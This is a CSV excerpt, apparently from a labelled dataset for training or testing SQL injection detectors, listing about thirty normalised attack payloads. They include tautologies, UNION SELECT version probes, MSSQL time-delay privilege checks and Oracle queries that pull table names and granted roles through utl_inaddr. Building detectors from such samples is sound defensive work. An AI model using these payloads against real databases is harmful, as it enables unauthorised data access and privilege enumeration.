row_index,payload_norm,label,sqli_type_hint
300,"select * from users where id = 1 or ""1]"" or 1 = 1 -- 1",1,
301,"select * from users where id = 1 or ""$?"" or 1 = 1 -- 1",1,
302,or x = x,1,
303,or a = a,1,
304,or '1' = '1,1,
305,"select * from users where id = 11<1# union select 1,version ( ) -- 1",1,
306,) ) or ( ( 'x' ) ) = ( ( 'x,1,
307,"select * from users where id = '1' or \.<1 union select 1,@@VERSION -- 1'",1,
308,"select * from users where id = '1' <@&1 union select 1,version ( ) -- 1'",1,
309,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1,
310,; if is_srvrolemember ( 'sysadmin' ) > 0 waitfor delay '0:0:2' --,1,
311,select * from users where id = 1 <@<@ or 1 = 1 -- 1,1,
312,"select * from users where id = 1 union select @<@$,version ( ) -- 1",1,
313,"select * from users where id = '1' <@<@ union select 1,version ( ) -- 1'",1,
314,"select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1,
315,"select * from users where id = 1 or 1#""{ union select version ( ) ,version ( ) -- 1",1,
316,a' or 1 = 1--,1,
317,) or ( a = a,1,
318,""" ) ) or ( ( ""x"" ) ) = ( ( ""x",1,
319,"select * from users where id = 1 or 1#""; or 1 = 1 -- 1",1,
320,"select * from users where id = '1' <@$_ union select 1,version ( ) -- 1'",1,
321,-- &password =,1,
322,select * from users where id = 1 <@. or 1 = 1 -- 1,1,
323,"select * from users where id = 1 or "" ( ) "" or 1 = 1 -- 1",1,
324,"select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1",1,
325,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 3 ) ) AND 'i' = 'i",1,
326,admin' or 1 = 1,1,
327,"select * from users where id = 1 or "";,"" = 1 or 1 = 1 -- 1",1,
328,"select * from users where id = 1 union select @||1,version ( ) -- 1",1,
329,"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1,
